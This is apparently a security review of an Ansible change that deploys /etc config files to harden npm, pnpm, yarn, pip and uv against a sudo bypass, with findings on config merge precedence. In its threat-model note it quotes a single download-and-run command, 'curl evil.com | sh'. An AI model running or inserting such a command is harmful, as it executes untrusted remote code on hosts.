# Differential Security Review: /etc system-wide config deployment

**Scope:** uncommitted changes on `main` adding system-wide config file
deployment to close the sudo-bypass gap. Motivated by the AntV /
Shai-Hulud npm incident (2026-05-19).

**Codebase size:** SMALL (~30 files). Strategy: DEEP.

**Files changed:**
| File | Lines | Risk |
|---|---|---|
| `templates/etc-npmrc.j2` (new) | +40 | MEDIUM |
| `tasks/npm.yml` | +15 | MEDIUM |
| `tasks/yarn.yml` | +12 | MEDIUM |
| `tasks/pip.yml` | +14 | MEDIUM |
| `tasks/uv.yml` | +23 | MEDIUM |
| `tests/bats/01-config-files.bats` | +34 | LOW |
| `README.md` | +11 | LOW |

No HIGH risk classification (no auth, crypto, or external network code
changed). MEDIUM rating reflects system-wide blast radius — these files
affect every user on the host, including root and unattended service
accounts.

---

## Summary

One MEDIUM finding worth fixing, two LOW observations, and pre-existing
items already discussed in conversation and consciously deferred. The
overall change accomplishes its stated goal correctly: file
ownership/permissions are appropriate, the deployment is idempotent,
test coverage was added.

### Findings

| # | Severity | Title |
|---|----------|-------|
| 1 | MEDIUM | `/etc/npmrc` unconditional `ignore-scripts=true` silently disables `pnpm_built_dependencies` allowlist |
| 2 | LOW | README precedence claim ("user > system") is incomplete in light of finding #1 |
| 3 | INFO | `/etc/pip.conf` `only-binary=:all:` now applies to sudo/root pip — behavior change |

---

## Finding 1 (MEDIUM): pnpm allowlist silently broken when configured

### Where

- `templates/etc-npmrc.j2:14` — unconditional `ignore-scripts=true`
- Interacts with `templates/pnpm-rc.j2:8-18` — conditional rendering
  block where `ignore-scripts=true` is **only emitted when
  `pnpm_built_dependencies` is empty**.

### What

In `pnpm-rc.j2`, the existing design is deliberate: when the operator
configures `pnpm_built_dependencies` (added in commit `ff5fb5a`,
"Harden pnpm rc: strict age gate, build-script allowlist, exclude
list"), the user rc switches from blanket `ignore-scripts=true` to a
`only-built-dependencies=[...]` allowlist — so packages on the
allowlist *can* run build scripts.

`etc-npmrc.j2` now writes `ignore-scripts=true` **unconditionally** to
`/etc/npmrc`. pnpm reads `/etc/npmrc` as a lower-priority layer, but
its config merging is **per-key**, not per-file. The user rc omits the
`ignore-scripts` key entirely (it's gated behind the `{% else %}`
branch), so there's nothing in the higher-priority layer to override
the lower-priority value. Effective merged config for pnpm becomes:

```
ignore-scripts=true            ← from /etc/npmrc
only-built-dependencies=[...]  ← from user rc
```

`ignore-scripts=true` is a hard global block in pnpm and takes
precedence over the allowlist — build scripts never run, even for
allowlisted packages.

### Why it matters

- The pnpm allowlist is **the** mechanism this role provides for users
  who legitimately need build scripts for specific packages (native
  bindings: `esbuild`, `sharp`, `node-sass`, etc.).
- The break is **silent**: the install succeeds, but native modules
  never compile. Downstream failures (`Error: Cannot find module
  'esbuild/lib/main.js'` or similar) won't obviously point back to this
  config.
- Affects **all callers, not just sudo** — because the override fails
  in the normal merge path regardless of `$HOME`.
- No test catches this: `grep` on `tests/bats/` shows zero tests
  exercise `pnpm_built_dependencies` with a non-empty value.
- Recent commit `ff5fb5a` (the feature this regresses) explicitly
  emphasizes "Build-script allowlist" as a hardening capability. This
  change inadvertently removes it.

### Exploitability rating

LOW exploitability, MEDIUM functional impact. Not a security exposure
— actually *more* restrictive — but it breaks a documented role feature
silently. From a security review lens this is a regression of a hardening
capability, not a vulnerability.

### Recommended fix

In `templates/pnpm-rc.j2`, the `{% if pnpm_built_dependencies | length > 0 %}`
branch should explicitly emit `ignore-scripts=false` to override the
system-wide setting:

```jinja
{% if pnpm_built_dependencies | length > 0 %}
; Override /etc/npmrc's ignore-scripts=true so the allowlist below takes
; effect. Without this, /etc/npmrc's setting wins (per-key merge) and
; build scripts are blocked even for allowlisted packages.
ignore-scripts=false
{% for pkg in pnpm_built_dependencies %}
only-built-dependencies[]={{ pkg }}
{% endfor %}
{% else %}
ignore-scripts=true
{% endif %}
```

Also: add a bats test that asserts when `pnpm_built_dependencies` is
non-empty, build scripts for an allowlisted package actually execute.
This is a pre-existing test gap that this change makes more
consequential.

---

## Finding 2 (LOW): README precedence claim is misleading

### Where

`README.md`, new "System-wide fallback" section:
> User-level configs still override these (precedence: project > user >
> system in every ecosystem).

### What

The precedence claim is correct only for *keys that the user-level
file explicitly sets*. Per-key merge semantics mean an *omitted* key
in the user file allows the system value to apply. This is exactly the
mechanism that produces finding #1.

### Recommended fix

Rephrase to be precise about the merge model:

> User-level configs override these *per-key* — i.e., a setting present
> in the user file wins, but a setting omitted from the user file falls
> through to the system value. This matters when the user file
> deliberately omits a key (e.g., pnpm's `ignore-scripts` is omitted
> when `pnpm_built_dependencies` is configured); in such cases the user
> file must explicitly set the value it wants, not rely on omission.

---

## Finding 3 (INFO): Behavior change for sudo callers in pip + yarn

### Where

- `/etc/pip.conf` deploys `only-binary = :all:` (refuses sdists)
- `/etc/yarnrc.yml` deploys `enableScripts: false`

### What

Both settings now apply to every user including root. Before this
change, a `sudo pip install foo-sdist-only-package` would install
because root's pip had no `/etc/pip.conf` to consult; same for `sudo
yarn add some-pkg-with-postinstall`.

This is the *intended* effect of the change — closing the sudo gap.
It's flagged here as INFO because it's a real behavioral change for
operators who were relying on `sudo` as an implicit escape hatch:

- Bootstrap/provisioning scripts that intentionally `sudo pip install`
  sdist-only packages (rare for production deps, common for niche
  legacy tools) will now fail with "no binary distribution available".
- `sudo yarn install` for any package with a legitimate postinstall
  (native bindings, prisma client generation, etc.) will now skip
  scripts and may produce broken installs.

### Recommendation

No code change. Mention in README "Limitations":

> Closing the sudo gap means sudo invocations of pip, yarn, npm, and
> uv now respect the same restrictions as the deploying user.
> Operators who relied on sudo to bypass the hardening (e.g., to
> install sdist-only Python packages or trigger yarn postinstall for
> native bindings) will see those workflows break. Override via
> per-invocation flags or by writing a root-owned per-user config that
> intentionally relaxes the setting.

---

## Pre-existing items, consciously deferred

These came up in the conversation that produced this change and were
deliberately not addressed. Listing for the record so they don't get
lost.

### A. Template-injection ordering

`pnpm.yml` validates `pnpm_built_dependencies` and
`pnpm_minimum_release_age_exclude` against npmrc injection
(`tasks/pnpm.yml:26-41`), but `npm.yml` (which now writes the same
values into `/etc/npmrc`) runs first in `tasks/main.yml`. If a vars
file passes a value containing a newline, `/etc/npmrc` is written
with the injection on disk before `pnpm.yml` halts.

Threat model: an operator providing untrusted vars is the attacker;
they can already do `shell: curl evil.com | sh`. Severity is low
enough that the conversation participants explicitly chose not to
fix. Documented here so future reviewers don't re-discover and re-fix
it without context.

### B. Ecosystems without a system config path

bun, cargo, composer, bundler — no system-wide config path exists for
these tools, so the sudo gap remains for them. README's Limitations
section documents this explicitly. Workaround would be to write
`/root/.bunfig.toml`, `/root/.cargo/config.toml`, etc., which closes
the sudo case but not other-user cases; explicitly out of scope for
this change per user decision.

---

## Positive observations

- **File ownership and permissions** are correct: 0644 root:root for
  all `/etc/*` files, 0755 root:root for `/etc/uv` directory.
  Readable by all users (required), writable only by root.
- **`become: true` is explicit on each task.** Failure mode is clear
  if sudo isn't available — the task halts loudly rather than
  silently skipping the system file.
- **Idempotent via Ansible template module** — re-runs produce the
  same result, no drift.
- **Templates reused where possible**: `/etc/yarnrc.yml`,
  `/etc/pip.conf`, `/etc/uv/uv.toml` all reuse the existing user
  templates, which means user-level test coverage of those templates
  carries over.
- **Bats coverage added** for each new `/etc/*` file. The new
  assertions are simple grep-based existence checks — appropriate for
  the change.
- **Comments in each task** explain *why* the system file is needed
  (sudo / other-user gap), not just *what* the task does. Good for
  future maintainers.
- **README updated truthfully** — the previous "the `.npmrc` config
  file still applies" claim under sudo (which was wrong) has been
  corrected.

---

## Coverage limitations

- This review did not exercise the bats suite (Docker harness
  unavailable in this environment). The new bats assertions were
  syntactically validated only.
- Pnpm merge-precedence behavior asserted from pnpm
  documentation (https://pnpm.io/npmrc) rather than runtime
  experimentation. If finding #1's behavioral claim is wrong, it
  would be wrong in the direction of being a non-issue.
- Did not test the behavior of the `etc-npmrc.j2` template with
  non-default values of `pnpm_built_dependencies` or
  `pnpm_minimum_release_age_exclude`.

---

## Risk classification rationale

- **MEDIUM** (not HIGH) because the changes don't touch auth, crypto,
  external network calls, or value transfer. They modify file
  deployment.
- **Not LOW** because system-wide file deployment has broader blast
  radius than per-user files, and one of the deployed files
  (`/etc/npmrc`) interacts non-obviously with an existing template's
  conditional logic (finding #1).
